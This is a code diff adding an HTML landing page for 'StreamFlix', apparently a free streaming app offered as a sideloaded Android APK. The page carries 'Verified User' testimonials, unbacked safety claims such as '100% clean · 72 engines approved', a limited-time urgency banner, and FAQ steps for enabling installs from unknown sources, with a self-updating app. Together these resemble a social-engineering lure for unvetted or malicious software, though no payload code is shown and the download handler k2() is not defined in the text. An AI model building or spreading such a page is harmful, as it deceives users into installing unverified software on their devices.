+          <div class="cr-meta"><span class="rate">★ 4.4</span><span class="views">14.2M views</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="statband">
+    <div class="cell"><b>10K+</b><span>Movies</span></div>
+    <div class="cell"><b>4.8&#9733;</b><span>Stars</span></div>
+    <div class="cell"><b>50M+</b><span>Downloads</span></div>
+  </div>
+</section>
+
+<!-- ============================================================
+     FEATURES — horizontal shelf
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-head">
+    <div class="kicker">Why Choose Us</div>
+    <h2>Movies, <em>endless fun</em></h2>
+  </div>
+
+  <div class="shelf">
+    <div class="shelf-card">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg></div>
+      <h3>HD &amp; 4K Streaming</h3>
+      <p>Crystal-clear picture up to 4K. Every detail, on any screen.</p>
+    </div>
+    <div class="shelf-card">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div>
+      <h3>Offline Mode</h3>
+      <p>Download and watch offline. Anywhere, without using data.</p>
+    </div>
+    <div class="shelf-card">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+      <h3>Multi-Device</h3>
+      <p>Phone, tablet, or TV. Pick up where you left off on any device.</p>
+    </div>
+    <div class="shelf-card">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+      <h3>New Releases Weekly</h3>
+      <p>New movies every week. Action, romance, drama, comedy — always something fresh.</p>
+    </div>
+  </div>
+  <p class="shelf-hint">Swipe to explore</p>
+
+  <div class="feature-banner">
+    <h3>&#9889; Everything for movie night</h3>
+    <ul>
+      <li><span class="d"></span><span><strong>Weekly Updates</strong> — new movies and shows every week</span></li>
+      <li><span class="d"></span><span><strong>AI Recommendations</strong> — the algorithm learns what you like</span></li>
+      <li><span class="d"></span><span><strong>Unlimited Genres</strong> — romance, drama, action, thriller, and more</span></li>
+      <li><span class="d"></span><span><strong>AI Subtitles</strong> — real-time translation in over 40 languages</span></li>
+    </ul>
+  </div>
+</section>
+
+<!-- ============================================================
+     REVIEWS — spotlight
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-head">
+    <div class="kicker">Loved by Millions</div>
+    <h2>Don't just take <em>our word for it</em></h2>
+  </div>
+
+  <div class="spotlight">
+    <div class="spotlight-track" id="spotTrack">
+      <div class="review">
+        <span class="qmark">&ldquo;</span>
+        <div class="stars"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
+        <p>&ldquo;Finally a movie app that delivers. Crystal-clear HD streaming and a huge selection. I don't use other apps anymore.&rdquo;</p>
+        <div class="who"><img class="av" src="img/avatar-sarah.jpg" alt="Sarah Mitchell"><div style="text-align:left"><div class="n">Sarah Mitchell</div><div class="t">Verified User</div></div></div>
+      </div>
+      <div class="review">
+        <span class="qmark">&ldquo;</span>
+        <div class="stars"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
+        <p>&ldquo;I'm addicted to these movies. The recommendations always hit what I want to watch, and I can continue on any device.&rdquo;</p>
+        <div class="who"><img class="av" src="img/avatar-james.jpg" alt="James Rodriguez"><div style="text-align:left"><div class="n">James Rodriguez</div><div class="t">Verified User</div></div></div>
+      </div>
+      <div class="review">
+        <span class="qmark">&ldquo;</span>
+        <div class="stars"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
+        <p>&ldquo;Excellent picture quality and a huge library of movies. Offline downloads work flawlessly, and there are no ads. Highly recommend.&rdquo;</p>
+        <div class="who"><img class="av" src="img/avatar-emily.jpg" alt="Emily Chen"><div style="text-align:left"><div class="n">Emily Chen</div><div class="t">Verified User</div></div></div>
+      </div>
+    </div>
+  </div>
+  <div class="spot-dots" id="spotDots">
+    <span class="spot-dot on"></span><span class="spot-dot"></span><span class="spot-dot"></span>
+  </div>
+
+  <div class="numbers">
+    <div class="number"><b>50M+</b><span>Total Downloads</span></div>
+    <div class="number"><b>4.8&#9733;</b><span>Average Rating</span></div>
+    <div class="number"><b>190</b><span>Countries Available</span></div>
+    <div class="number"><b>99.9%</b><span>Uptime</span></div>
+  </div>
+</section>
+
+<!-- ============================================================
+     SECURITY
+     ============================================================ -->
+<section class="section reveal">
+  <div class="section-head">
+    <div class="kicker">Secure &amp; Verified</div>
+    <h2>Your security is <em>our priority</em></h2>
+    <p class="sub">Every version is analyzed, signed, and verified before reaching you.</p>
+  </div>
+
+  <div class="security">
+    <div class="security-row">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg></div>
+      <div class="txt"><strong>VirusTotal Analyzed</strong><span>100% clean · 72 engines approved</span></div>
+    </div>
+    <div class="security-row">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg></div>
+      <div class="txt"><strong>SHA-256 Signed</strong><span>Cryptographically verified · tamper-proof</span></div>
+    </div>
+    <div class="security-row">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+      <div class="txt"><strong>Automatic Updates</strong><span>Get the latest version as soon as we publish it</span></div>
+    </div>
+    <div class="security-row">
+      <div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="3"/><path d="M4.93 4.93l1.41 1.41"/><path d="M17.66 17.66l1.41 1.41"/></svg></div>
+      <div class="txt"><strong>No Permission Abuse</strong><span>Only requests what is strictly necessary</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================
+     DOWNLOAD
+     ============================================================ -->
+<section class="download reveal">
+  <div class="kicker">Limited Time</div>
+  <h2>Movies, <em>big emotions</em></h2>
+  <div class="urgency"><span class="pulse"></span> Limited-time free launch offer</div>
+  <p>Thousands of movies and series. Stream in HD and 4K. Download and watch offline. New releases every week. No ads.</p>
+  <button class="btn btn-primary" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    Download Free — Watch Now
+  </button>
+  <p class="note">Android 8.0+ · No credit card · No ads</p>
+</section>
+
+<!-- ============================================================
+     FAQ
+     ============================================================ -->
+<section class="section reveal" style="padding-bottom:90px">
+  <div class="section-head">
+    <div class="kicker">Frequently Asked Questions</div>
+    <h2>Have questions? <em>We have answers.</em></h2>
+  </div>
+
+  <div class="faq">
+    <div class="faq-entry">
+      <button class="faq-q" onclick="toggleFaq(this)">Is it safe to install the APK?<span class="faq-ind"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button>
+      <div class="faq-a"><div class="faq-a-inner">Absolutely. Every version goes through VirusTotal analysis (over 72 engines), SHA-256 code signing, and manual security review before release. We never include adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.</div></div>
+    </div>
+    <div class="faq-entry">
+      <button class="faq-q" onclick="toggleFaq(this)">Why isn't the app on Google Play or the App Store?<span class="faq-ind"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button>
+      <div class="faq-a"><div class="faq-a-inner">We are in a rapid iteration phase — releasing updates every 2 weeks with new features and improvements. Direct distribution allows us to move faster without the review delays of app stores. Store releases are planned for late 2026 once we reach our full-feature milestone. Same app, same quality, just faster updates for you.</div></div>
+    </div>
+    <div class="faq-entry">
+      <button class="faq-q" onclick="toggleFaq(this)">How do I install the APK on Android?<span class="faq-ind"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button>
+      <div class="faq-a"><div class="faq-a-inner">1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you're done! The app will update automatically afterward — you don't need to manually download future versions.</div></div>
+    </div>
+    <div class="faq-entry">
+      <button class="faq-q" onclick="toggleFaq(this)">Is it really free? What's the catch?<span class="faq-ind"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button>
+      <div class="faq-a"><div class="faq-a-inner">Yes — 100% free. No hidden charges, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best experience, growth will follow naturally. Premium features (like offline downloads) are also free during our launch period. Enjoy them while they last!</div></div>
+    </div>
+    <div class="faq-entry">
+      <button class="faq-q" onclick="toggleFaq(this)">Which devices and OS versions are supported?<span class="faq-ind"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button>
+      <div class="faq-a"><div class="faq-a-inner">Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best experience. Chromecast and AirPlay are built in.</div></div>
+    </div>
+    <div class="faq-entry">
+      <button class="faq-q" onclick="toggleFaq(this)">How do I get updates after installing?<span class="faq-ind"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button>
+      <div class="faq-a"><div class="faq-a-inner">The app has a built-in automatic updater. When a new version is available, you'll receive a notification inside the app — just tap "Update" and it handles everything. You don't need to revisit this page or manually download again. We release updates roughly every 2 weeks with fixes and new features.</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div>© 2026 StreamFlix</div>
+  <div class="links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Security</a></div>
+</footer>
+
+</main>
+
+<!-- ============================================================
+     FLOAT BAR
+     ============================================================ -->
+<div class="floatbar" id="floatBar">
+  <button class="btn btn-primary" onclick="k2()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    Download Free
+  </button>
+</div>
+
+<script>
+// ---- Topbar scroll ----
+var topbar=document.getElementById('topbar');
+function updateTopbar(){
+  if(window.scrollY>20){topbar.classList.add('scrolled')}
+  else{topbar.classList.remove('scrolled')}
+}
+window.addEventListener('scroll',updateTopbar,{passive:true});
+
+// ---- Floating bar: always visible from page load ----
+
+// ---- Scroll reveal ----
+var revealObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){entry.target.classList.add('visible');revealObserver.unobserve(entry.target)}
+  });
+},{threshold:0.08,rootMargin:'0px 0px -20px 0px'});
+document.querySelectorAll('.reveal').forEach(function(el){revealObserver.observe(el)});
+
+// ---- FAQ ----
+function toggleFaq(q){
+  var item=q.parentElement;
+  var wasOpen=item.classList.contains('open');
+  document.querySelectorAll('.faq-entry').forEach(function(i){i.classList.remove('open')});
+  if(!wasOpen)item.classList.add('open');
+}
+
+// ---- Review spotlight ----
+(function(){
+  var track=document.getElementById('spotTrack');
+  var dots=document.getElementById('spotDots').children;
+  var idx=0,total=dots.length,timer;
+  function go(n){
+    idx=n;
+    track.style.transform='translateX(-'+(idx*100)+'%)';
+    for(var i=0;i<total;i++){dots[i].classList.toggle('on',i===idx)}
+  }
+  function next(){go((idx+1)%total)}
+  function start(){timer=setInterval(next,5000)}
+  function stop(){clearInterval(timer)}
+  for(var i=0;i<total;i++){
+    (function(i){dots[i].addEventListener('click',function(){stop();go(i);start()})})(i);
+  }
+  var spot=track.parentElement;
+  spot.addEventListener('touchstart',stop,{passive:true});
+  spot.addEventListener('touchend',start,{passive:true});
+  start();
+})();
+</script>
+</body>
+</html>
